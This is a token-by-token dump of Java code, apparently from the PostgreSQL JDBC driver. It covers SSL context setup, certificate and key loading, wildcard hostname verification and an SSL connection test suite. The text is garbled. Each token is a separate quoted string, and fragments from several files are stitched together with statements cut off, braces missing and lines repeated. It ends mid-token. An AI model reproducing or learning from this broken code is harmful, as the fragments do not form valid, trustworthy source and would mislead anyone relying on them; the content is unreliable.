"ALT_DNS_NAME", "=", "2", ";", "LazyKeyManager", "km", "=", "null", ";", "String", "sslmode", ";", "*", "sslmode", ",", "sslcert", ",", "sslkey", ",", "sslrootcert", ",", "sslhostnameverifier", ",", "sslpasswordcallback", ",", "sslpassword", "try", "{", "sslmode", "=", "PGProperty", ".", "SSL_MODE", ".", "get", "(", "info", ")", ";", "SSLContext", "ctx", "=", "SSLContext", ".", "getInstance", "(", "\"", "TLS", "\"", ");", "/", "/", "or", "\"", "SSL", "\"", "?", "/", "/", "Determining", "the", "default", "file", "location", "String", "pathsep", "=", "System", ".", "getProperty", "(", "\"", "file", ".", "separator", "\"", ");", "String", "defaultdir", ";", "boolean", "defaultfile", "=", "false", ";", "if", "(", "System", ".", "getProperty", "(", "\"", "os", ".", "name", "\"", ").", "toLowerCase", "(", ").", "contains", "(", "\"", "windows", "\"", "))", "{", "/", "/", "It", "is", "Windows", "defaultdir", "=", "System", ".", "getenv", "(", "\"", "APPDATA", "\"", ")", "+", "pathsep", "+", "\"", "postgresql", "\"", "+", "pathsep", ";", "}", "else", "{", "defaultdir", "=", "System", ".", "getProperty", "(", "\"", "user", ".", "home", "\"", ")", "+", "pathsep", "+", "\"", ".", "postgresql", "\"", "+", "pathsep", ";", "}", "/", "/", "Load", "the", "client", "'", "s", "certificate", "and", "key", "String", "sslcertfile", "=", "PGProperty", ".", "SSL_CERT", ".", "get", "(", "info", ")", ";", "if", "(", "sslcertfile", "=", "=", "null", ")", "{", "/", "/", "Fall", "back", "to", "default", "defaultfile", "=", "true", ";", "sslcertfile", "=", "defaultdir", "+", "\"", "postgresql", ".", "crt", "\"", ";", "}", "String", "sslkeyfile", "=", "PGProperty", ".", "SSL_KEY", ".", "get", "(", "info", ")", ";", "if", "(", "sslkeyfile", "=", "=", "null", ")", "{", "/", "/", "Fall", "back", "to", "default", "defaultfile", "=", "true", ";", "sslkeyfile", "=", "defaultdir", "+", "\"", "postgresql", ".", "pk8", "\"", ";", "}", "/", "/", "Determine", "the", "callback", "handler", "CallbackHandler", "cbh", ";", "String", "sslpasswordcallback", "=", "PGProperty", ".", "SSL_PASSWORD_CALLBACK", ".", "get", "(", "info", ")", ";", "if", "(", "sslpasswordcallback", "!", "=", "null", ")", "{", "try", "{", "cbh", "=", "(", "CallbackHandler", ")", "MakeSSL", ".", "instantiate", "(", "sslpasswordcallback", ",", "info", ",", "false", ",", "null", ")", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "The", "password", "callback", "class", "provided", "{", "0", "}", "could", "not", "be", "instantiated", ".", "\",", "sslpasswordcallback", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "e", ")", ";", "}", "}", "else", "{", "cbh", "=", "new", "ConsoleCallbackHandler", "(", "PGProperty", ".", "SSL_PASSWORD", ".", "get", "(", "info", ")", ");", "}", "/", "/", "If", "the", "properties", "are", "empty", ",", "give", "null", "to", "prevent", "client", "key", "selection", "km", "=", "new", "LazyKeyManager", "(", "(\"", "\".", "equals", "(", "sslcertfile", ")", "?", "null", ":", "sslcertfile", ")", ",", "(", "\"\"", ".", "equals", "(", "sslkeyfile", ")", "?", "null", ":", "sslkeyfile", ")", ",", "cbh", ",", "defaultfile", ")", ";", "TrustManager", "[", "]", "tm", ";", "if", "(", "\"", "verify", "-", "ca", "\"", ".", "equals", "(", "sslmode", ")", "|", "|", "\"", "verify", "-", "full", "\"", ".", "equals", "(", "sslmode", ")", ")", "{", "/", "/", "Load", "the", "server", "certificate", "TrustManagerFactory", "tmf", "=", "TrustManagerFactory", ".", "getInstance", "(", "\"", "PKIX", "\"", ");", "KeyStore", "ks", ";", "try", "{", "ks", "=", "KeyStore", ".", "getInstance", "(", "\"", "jks", "\"", ");", "}", "catch", "(", "KeyStoreException", "e", ")", "{", "/", "/", "this", "should", "never", "happen", "throw", "new", "NoSuchAlgorithmException", "(", "\"", "jks", "KeyStore", "not", "available", "\"", ");", "}", "String", "sslrootcertfile", "=", "PGProperty", ".", "SSL_ROOT_CERT", ".", "get", "(", "info", ")", ";", "if", "(", "sslrootcertfile", "=", "=", "null", ")", "{", "/", "/", "Fall", "back", "to", "default", "sslrootcertfile", "=", "defaultdir", "+", "\"", "root", ".", "crt", "\"", ";", "}", "FileInputStream", "fis", ";", "try", "{", "fis", "=", "new", "FileInputStream", "(", "sslrootcertfile", ")", ";", "/", "/", "NOSONAR", "}", "catch", "(", "FileNotFoundException", "ex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "open", "SSL", "root", "certificate", "file", "{", "0", "}", ".\"", ",", "sslrootcertfile", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ex", ")", ";", "}", "try", "{", "CertificateFactory", "cf", "=", "CertificateFactory", ".", "getInstance", "(", "\"", "X", ".", "509", "\"", ");", "/", "/", "Certificate", "[", "]", "certs", "=", "cf", ".", "generateCertificates", "(", "fis", ")", ".", "toArray", "(", "new", "Certificate", "[", "]{", "})", ";", "/", "/", "Does", "/", "/", "not", "work", "in", "java", "1", ".", "4", "Object", "[", "]", "certs", "=", "cf", ".", "generateCertificates", "(", "fis", ")", ".", "toArray", "(", "new", "Certificate", "[", "]{", "})", ";", "ks", ".", "load", "(", "null", ",", "null", ")", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "certs", ".", "length", ";", "i", "+", "+)", "{", "ks", ".", "setCertificateEntry", "(", "\"", "cert", "\"", "+", "i", ",", "(", "Certificate", ")", "certs", "[", "i", "]", ");", "}", "tmf", ".", "init", "(", "ks", ")", ";", "}", "catch", "(", "IOException", "ioex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "read", "SSL", "root", "certificate", "file", "{", "0", "}", ".\"", ",", "sslrootcertfile", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ioex", ")", ";", "}", "catch", "(", "GeneralSecurityException", "gsex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Loading", "the", "SSL", "root", "certificate", "{", "0", "}", "into", "a", "TrustManager", "failed", ".", "\",", "sslrootcertfile", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "gsex", ")", ";", "}", "finally", "{", "try", "{", "fis", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "/", "*", "ignore", "*", "/", "}", "}", "tm", "=", "tmf", ".", "getTrustManagers", "(", ");", "}", "else", "{", "/", "/", "server", "validation", "is", "not", "required", "tm", "=", "new", "TrustManager", "[", "]{", "new", "NonValidatingTM", "(", ")}", ";", "}", "/", "/", "finally", "we", "can", "initialize", "the", "context", "try", "{", "ctx", ".", "init", "(", "new", "KeyManager", "[", "]{", "km", "}", ",", "tm", ",", "null", ")", ";", "}", "catch", "(", "KeyManagementException", "ex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "initialize", "SSL", "context", ".", "\")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ex", ")", ";", "}", "_factory", "=", "ctx", ".", "getSocketFactory", "(", ");", "}", "catch", "(", "NoSuchAlgorithmException", "ex", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Could", "not", "find", "a", "java", "cryptographic", "algorithm", ":", "{", "0", "}", ".\"", ",", "ex", ".", "getMessage", "(", "))", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "ex", ")", ";", "}", "*", "Propagates", "any", "exception", "from", "{", "@", "link", "LazyKeyManager", "}", ".", "*", "@", "throws", "PSQLException", "if", "there", "is", "an", "exception", "to", "propagate", "public", "void", "throwKeyManagerException", "(", ")", "throws", "PSQLException", "{", "if", "(", "km", "!", "=", "null", ")", "{", "km", ".", "throwKeyManagerException", "(", ");", "}", "}", "/", "**", "*", "A", "CallbackHandler", "that", "reads", "the", "password", "from", "the", "console", "or", "returns", "the", "password", "given", "to", "its", "*", "constructor", ".", "*", "/", "static", "class", "ConsoleCallbackHandler", "implements", "CallbackHandler", "{", "private", "char", "[", "]", "password", "=", "null", ";", "ConsoleCallbackHandler", "(", "String", "password", ")", "{", "if", "(", "password", "!", "=", "null", ")", "{", "this", ".", "password", "=", "password", ".", "toCharArray", "(", ");", "}", "}", "/", "**", "*", "Handles", "the", "callbacks", ".", "*", "*", "@", "param", "callbacks", "The", "callbacks", "to", "handle", "*", "@", "throws", "UnsupportedCallbackException", "If", "the", "console", "is", "not", "available", "or", "other", "than", "*", "PasswordCallback", "is", "supplied", "*", "/", "@", "Override", "public", "void", "handle", "(", "Callback", "[", "]", "callbacks", ")", "throws", "IOException", ",", "UnsupportedCallbackException", "{", "Console", "cons", "=", "System", ".", "console", "(", ");", "if", "(", "cons", "=", "=", "null", "&", "&", "password", "=", "=", "null", ")", "{", "throw", "new", "UnsupportedCallbackException", "(", "callbacks", "[", "0", "]", ",", "\"", "Console", "is", "not", "available", "\"", ");", "}", "for", "(", "Callback", "callback", ":", "callbacks", ")", "{", "if", "(", "callback", "instanceof", "PasswordCallback", ")", "{", "if", "(", "password", "=", "=", "null", ")", "{", "/", "/", "It", "is", "used", "instead", "of", "cons", ".", "readPassword", "(", "prompt", ")", ",", "because", "the", "prompt", "may", "contain", "'", "%'", "/", "/", "characters", "(", "(", "PasswordCallback", ")", "callback", ")", ".", "setPassword", "(", "cons", ".", "readPassword", "(", "\"%", "s", "\"", ",", "(", "(", "PasswordCallback", ")", "callback", ")", ".", "getPrompt", "(", "))", ");", "}", "else", "{", "(", "(", "PasswordCallback", ")", "callback", ")", ".", "setPassword", "(", "password", ")", ";", "}", "}", "else", "{", "throw", "new", "UnsupportedCallbackException", "(", "callback", ")", ";", "}", "}", "}", "}", "if", "(", "hostname", "=", "=", "null", "|", "|", "pattern", "=", "=", "null", ")", "{", "return", "false", ";", "}", "if", "(", "!", "pattern", ".", "startsWith", "(", "\"*", "\")", ")", "{", "/", "/", "No", "wildcard", "=", ">", "just", "compare", "hostnames", "return", "hostname", ".", "equalsIgnoreCase", "(", "pattern", ")", ";", "}", "/", "/", "pattern", "starts", "with", "*", ",", "so", "hostname", "should", "be", "at", "least", "(", "pattern", ".", "length", "-", "1", ")", "long", "if", "(", "hostname", ".", "length", "(", ")", "<", "pattern", ".", "length", "(", ")", "-", "1", ")", "{", "return", "false", ";", "}", "/", "/", "Compare", "ignore", "case", "final", "boolean", "ignoreCase", "=", "true", ";", "/", "/", "Below", "code", "is", "\"", "hostname", ".", "endsWithIgnoreCase", "(", "pattern", ".", "withoutFirstStar", "(", "))", "\"", "/", "/", "E", ".", "g", ".", "hostname", "=", "=", "sub", ".", "host", ".", "com", ";", "pattern", "=", "=*", ".", "host", ".", "com", "/", "/", "We", "need", "to", "start", "the", "offset", "of", "\"", ".", "host", ".", "com", "\"", "in", "hostname", "/", "/", "For", "this", "we", "take", "hostname", ".", "length", "(", ")", "-", "pattern", ".", "length", "(", ")", "/", "/", "and", "+", "1", "is", "required", "since", "pattern", "is", "known", "to", "start", "with", "*", "int", "toffset", "=", "hostname", ".", "length", "(", ")", "-", "pattern", ".", "length", "(", ")", "+", "1", ";", "/", "/", "Wildcard", "covers", "just", "one", "domain", "level", "/", "/", "a", ".", "b", ".", "c", ".", "com", "should", "not", "be", "covered", "by", "*", ".", "c", ".", "com", "if", "(", "hostname", ".", "lastIndexOf", "(", "'.", "',", "toffset", "-", "1", ")", ">", "=", "0", ")", "{", "/", "/", "If", "there", "'", "s", "a", "dot", "in", "between", "0", ".", ".", "toffset", "return", "false", ";", "return", "hostname", ".", "regionMatches", "(", "ignoreCase", ",", "toffset", ",", "pattern", ",", "1", ",", "pattern", ".", "length", "(", ")", "-", "1", ")", ";", "X509Certificate", "[", "]", "peerCerts", ";", "try", "{", "peerCerts", "=", "(", "X509Certificate", "[", "])", "session", ".", "getPeerCertificates", "(", ");", "}", "catch", "(", "SSLPeerUnverifiedException", "e", ")", "{", "return", "false", ";", "if", "(", "peerCerts", "=", "=", "null", "|", "|", "peerCerts", ".", "length", "=", "=", "0", ")", "{", "return", "false", ";", "}", "/", "/", "Extract", "the", "common", "name", "X509Certificate", "serverCert", "=", "peerCerts", "[", "0", "]", ";", "try", "{", "/", "/", "Check", "for", "Subject", "Alternative", "Names", "(", "see", "RFC", "6125", ")", "Collection", "<", "List", "<", "?>", ">", "subjectAltNames", "=", "serverCert", ".", "getSubjectAlternativeNames", "(", ");", "if", "(", "subjectAltNames", "!", "=", "null", ")", "{", "for", "(", "List", "<", "?>", "sanit", ":", "subjectAltNames", ")", "{", "Integer", "type", "=", "(", "Integer", ")", "sanit", ".", "get", "(", "0", ")", ";", "String", "san", "=", "(", "String", ")", "sanit", ".", "get", "(", "1", ")", ";", "/", "/", "this", "mimics", "libpq", "check", "for", "ALT_DNS_NAME", "if", "(", "type", "!", "=", "null", "&", "&", "type", "=", "=", "ALT_DNS_NAME", "&", "&", "verifyHostName", "(", "hostname", ",", "san", ")", ")", "{", "return", "true", ";", "}", "}", "}", "}", "catch", "(", "CertificateParsingException", "e", ")", "{", "return", "false", ";", "}", "LdapName", "DN", ";", "try", "{", "DN", "=", "new", "LdapName", "(", "serverCert", ".", "getSubjectX500Principal", "(", ").", "getName", "(", "X500Principal", ".", "RFC2253", ")", ");", "}", "catch", "(", "InvalidNameException", "e", ")", "{", "return", "false", ";", "}", "String", "CN", "=", "null", ";", "for", "(", "Rdn", "rdn", ":", "DN", ".", "getRdns", "(", "))", "{", "if", "(", "\"", "CN", "\"", ".", "equals", "(", "rdn", ".", "getType", "(", "))", ")", "{", "/", "/", "Multiple", "AVAs", "are", "not", "treated", "CN", "=", "(", "String", ")", "rdn", ".", "getValue", "(", ");", "break", ";", "}", "}", "return", "verifyHostName", "(", "hostname", ",", "CN", ")", ";", "*", "@", "param", "classname", "Nam", "of", "the", "class", "to", "instantiate", "return", "getURL", "(", "getServer", "(", "),", "getPort", "(", "))", ";", "+", "server", "+", "\"", ":\"", "+", "port", "+", "\"", "/\"", "+", "getDatabase", "(", ")", "return", "DriverManager", ".", "getConnection", "(", "getURL", "(", "),", "props", ")", ";", "PGNotification", "[", "]", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", ");", "PGNotification", "[", "]", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", ");", "&", "&", "(", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", "))", "=", "=", "null", ")", "{", "assertNotNull", "(", "notifications", ")", ";", "PGNotification", "[", "]", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", "500", ")", ";", "PGNotification", "[", "]", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", "10000", ")", ";", "PGNotification", "[", "]", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", "0", ")", ";", "PGNotification", "[", "]", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", "10000", ")", ";", "PGNotification", "[", "]", "notifications", "=", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", "0", ")", ";", "(", "(", "org", ".", "postgresql", ".", "PGConnection", ")", "conn", ")", ".", "getNotifications", "(", "40000", ")", ";", "LibPQFactoryHostNameTest", ".", "class", ",", "package", "org", ".", "postgresql", ".", "test", ".", "jdbc4", ";", "Assert", ".", "assertEquals", "(", "expected", ",", "LibPQFactory", ".", "verifyHostName", "(", "hostname", ",", "pattern", ")", ");", "*", "Copyright", "(", "c", ")", "2004", ",", "PostgreSQL", "Global", "Development", "Group", "import", "junit", ".", "framework", ".", "TestCase", ";", "import", "junit", ".", "framework", ".", "TestSuite", ";", "import", "java", ".", "sql", ".", "Connection", ";", "import", "java", ".", "sql", ".", "DriverManager", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "TreeMap", ";", "public", "class", "SslTest", "extends", "TestCase", "{", "/", "**", "*", "Tries", "to", "connect", "to", "the", "database", ".", "*", "*", "@", "param", "connstr", "Connection", "string", "for", "the", "database", "*", "@", "param", "expected", "Expected", "values", ".", "the", "first", "element", "is", "a", "String", "holding", "the", "expected", "message", "of", "*", "PSQLException", "or", "null", ",", "if", "no", "exception", "is", "expected", ",", "the", "second", "indicates", "weather", "ssl", "is", "*", "to", "be", "used", "(", "Boolean", ")", "*", "/", "protected", "void", "driver", "(", "String", "connstr", ",", "Object", "[", "]", "expected", ")", "throws", "SQLException", "{", "Connection", "conn", "=", "null", ";", "String", "exmsg", "=", "(", "String", ")", "expected", "[", "0", "]", ";", "try", "{", "conn", "=", "DriverManager", ".", "getConnection", "(", "connstr", ",", "TestUtil", ".", "getUser", "(", "),", "TestUtil", ".", "getPassword", "(", "))", ";", "if", "(", "exmsg", "!", "=", "null", ")", "{", "fail", "(", "\"", "Exception", "did", "not", "occur", ":", "\"", "+", "exmsg", ")", ";", "/", "/", "ResultSet", "rs", "=", "conn", ".", "createStatement", "(", ").", "executeQuery", "(", "\"", "select", "ssl_is_used", "(", ")\"", ");", "assertTrue", "(", "rs", ".", "next", "(", "))", ";", "assertEquals", "(", "\"", "ssl_is_used", ":", "\"", ",", "(", "(", "Boolean", ")", "expected", "[", "1", "]", ").", "booleanValue", "(", "),", "rs", ".", "getBoolean", "(", "1", ")", ");", "conn", ".", "close", "(", ");", "if", "(", "conn", "!", "=", "null", ")", "{", "conn", ".", "close", "(", ");", "if", "(", "exmsg", "=", "=", "null", ")", "{", "/", "/", "no", "exception", "is", "excepted", "fail", "(", "\"", "Exception", "thrown", ":", "\"", "+", "ex", ".", "getMessage", "(", "))", ";", "assertTrue", "(", "\"", "expected", ":", "\"", "+", "exmsg", "+", "\"", "actual", ":", "\"", "+", "ex", ".", "getMessage", "(", "),", "ex", ".", "getMessage", "(", ").", "matches", "(", "exmsg", ")", ");", "}", "protected", "String", "certdir", ";", "protected", "String", "connstr", ";", "protected", "String", "sslmode", ";", "protected", "boolean", "goodclient", ";", "protected", "boolean", "goodserver", ";", "protected", "String", "prefix", ";", "protected", "Object", "[", "]", "expected", ";", "private", "String", "makeConnStr", "(", "String", "sslmode", ",", "boolean", "goodclient", ",", "boolean", "goodserver", ")", "{", "return", "connstr", "+", "\"", "&", "sslmode", "=", "\"", "+", "sslmode", "+", "\"", "&", "sslcert", "=", "\"", "+", "certdir", "+", "\"", "/\"", "+", "prefix", "+", "(", "goodclient", "?", "\"", "goodclient", ".", "crt", "\"", ":", "\"", "badclient", ".", "crt", "\"", ")", "+", "\"", "&", "sslkey", "=", "\"", "+", "certdir", "+", "\"", "/\"", "+", "prefix", "+", "(", "goodclient", "?", "\"", "goodclient", ".", "pk8", "\"", ":", "\"", "badclient", ".", "pk8", "\"", ")", "+", "\"", "&", "sslrootcert", "=", "\"", "+", "certdir", "+", "\"", "/\"", "+", "prefix", "+", "(", "goodserver", "?", "\"", "goodroot", ".", "crt", "\"", ":", "\"", "badroot", ".", "crt", "\"", ")", "/", "/", "+", "\"", "&", "sslfactory", "=", "org", ".", "postgresql", ".", "ssl", ".", "NonValidatingFactory", "\"", "+", "\"", "&", "loglevel", "=", "\"", "+", "TestUtil", ".", "getLogLevel", "(", ");", "public", "SslTest", "(", "String", "name", ",", "String", "certdir", ",", "String", "connstr", ",", "String", "sslmode", ",", "boolean", "goodclient", ",", "boolean", "goodserver", ",", "String", "prefix", ",", "Object", "[", "]", "expected", ")", "{", "super", "(", "name", ")", ";", "this", ".", "certdir", "=", "certdir", ";", "this", ".", "connstr", "=", "connstr", ";", "this", ".", "sslmode", "=", "sslmode", ";", "this", ".", "goodclient", "=", "goodclient", ";", "this", ".", "goodserver", "=", "goodserver", ";", "this", ".", "prefix", "=", "prefix", ";", "this", ".", "expected", "=", "expected", ";", "static", "TestSuite", "getSuite", "(", "Properties", "prop", ",", "String", "param", ")", "{", "File", "certDirFile", "=", "TestUtil", ".", "getFile", "(", "prop", ".", "getProperty", "(", "\"", "certdir", "\"", "))", ";", "String", "certdir", "=", "certDirFile", ".", "getAbsolutePath", "(", ");", "String", "sconnstr", "=", "prop", ".", "getProperty", "(", "param", ")", ";", "String", "sprefix", "=", "prop", ".", "getProperty", "(", "param", "+", "\"", "prefix", "\"", ");", "String", "[", "]", "sslModes", "=", "{", "\"", "disable", "\"", ",", "\"", "allow", "\"", ",", "\"", "prefer", "\"", ",", "\"", "require", "\"", ",", "\"", "verify", "-", "ca", "\"", ",", "\"", "verify", "-", "full", "\"", "};", "TestSuite", "suite", "=", "new", "TestSuite", "(", ");", "Map", "<", "String", ",", "Object", "[", "]>", "expected", "=", "expectedmap", ".", "get", "(", "param", ")", ";", "if", "(", "expected", "=", "=", "null", ")", "{", "expected", "=", "defaultexpected", ";", "}", "for", "(", "String", "sslMode", ":", "sslModes", ")", "{", "suite", ".", "addTest", "(", "new", "SslTest", "(", "param", "+", "\"", "-\"", "+", "sslMode", "+", "\"", "GG3", "\"", ",", "certdir", ",", "sconnstr", ",", "sslMode", ",", "true", ",", "true", ",", "sprefix", ",", "expected", ".", "get", "(", "sslMode", "+", "\"", "GG", "\"", "))", ");", "suite", ".", "addTest", "(", "new", "SslTest", "(", "param", "+", "\"", "-\"", "+", "sslMode", "+", "\"", "GB3", "\"", ",", "certdir", ",", "sconnstr", ",", "sslMode", ",", "true", ",", "false", ",", "sprefix", ",", "expected", ".", "get", "(", "sslMode", "+", "\"", "GB", "\"", "))", ");", "suite", ".", "addTest", "(", "new", "SslTest", "(", "param", "+", "\"", "-\"", "+", "sslMode", "+", "\"", "BG3", "\"", ",", "certdir", ",", "sconnstr", ",", "sslMode", ",", "false", ",", "true", ",", "sprefix", ",", "expected", ".", "get", "(", "sslMode", "+", "\"", "BG", "\"", "))", ");", "}", "return", "suite", ";", "protected", "void", "runTest", "(", ")", "throws", "Throwable", "{", "driver", "(", "makeConnStr", "(", "sslmode", ",", "goodclient", ",", "goodserver", ")", ",", "expected", ")", ";", "static", "Map", "<", "String", ",", "Map", "<", "String", ",", "Object", "[", "]>", ">", "expectedmap", ";", "static", "TreeMap", "<", "String", ",", "Object", "[", "]>", "defaultexpected", ";", "/", "/", "For", "some", "strange", "reason", ",", "the", "v2", "driver", "begins", "these", "error", "messages", "by", "\"", "Connection", "rejected", ":", "\"", "/", "/", "but", "the", "v3", "does", "not", ".", "/", "/", "Also", ",", "for", "v2", "there", "are", "two", "spaces", "after", "FATAL", ":", ",", "and", "the", "message", "ends", "with", "\"", "\\", "n", ".", "\".", "static", "String", "PG_HBA_ON", "=", "\"", "(", "Connection", "rejected", ":", ")", "?", "FATAL", ":", "?", "no", "pg_hba", ".", "conf", "entry", "for", "host", ".", "*,", "user", ".", "*,", "database", ".", "*,", "SSL", "on", "(", "?", "s", "-", "d", ":", ".*", ")\"", ";", "static", "String", "PG_HBA_OFF", "=", "\"", "(", "Connection", "rejected", ":", ")", "?", "FATAL", ":", "?", "no", "pg_hba", ".", "conf", "entry", "for", "host", ".", "*,", "user", ".", "*,", "database", ".", "*,", "SSL", "off", "(", "?", "s", "-", "d", ":", ".*", ")\"", ";", "static", "String", "FAILED", "=", "\"", "The", "connection", "attempt", "failed", ".", "\";", "static", "String", "BROKEN", "=", "\"", "SSL", "error", ":", "(", "Broken", "pipe", "(", "\\", "\\(", "Write", "failed", "\\", "\\)", ")?", "|", "Received", "fatal", "alert", ":", "unknown_ca", "|", "Connection", "reset", "|", "Protocol", "wrong", "type", "for", "socket", ")", "\";", "static", "String", "SSLMODEALLOW", "=", "\"", "Invalid", "sslmode", "value", ":", "allow", "\"", ";", "static", "String", "SSLMODEPREFER", "=", "\"", "Invalid", "sslmode", "value", ":", "prefer", "\"", ";", "/", "/", "static", "String", "UNKNOWN", "=", "\"", "SSL", "error", ":", "Broken", "pipe", "\"", ";", "/", "/", "static", "String", "UNKNOWN", "=", "\"", "SSL", "error", ":", "Received", "fatal", "alert", ":", "unknown_ca", "\"", ";", "static", "String", "ANY", "=", "\"", ".*", "\";", "static", "String", "VALIDATOR", "=", "\"", "SSL", "error", ":", "sun", ".", "security", ".", "validator", ".", "ValidatorException", ":", "PKIX", "path", "(", "building", "|", "validation", ")", "failed", ":", ".*", "\";", "static", "String", "HOSTNAME", "=", "\"", "The", "hostname", ".", "*", "could", "not", "be", "verified", ".", "\";", "static", "{", "defaultexpected", "=", "new", "TreeMap", "<", "String", ",", "Object", "[", "]>", "()", ";", "defaultexpected", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "verify", "-", "caGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "defaultexpected", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", "=", "new", "TreeMap", "<", "String", ",", "Map", "<", "String", ",", "Object", "[", "]>", ">(", ");", "TreeMap", "<", "String", ",", "Object", "[", "]>", "work", ";", "work", "=", "(", "TreeMap", ")", "defaultexpected", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", 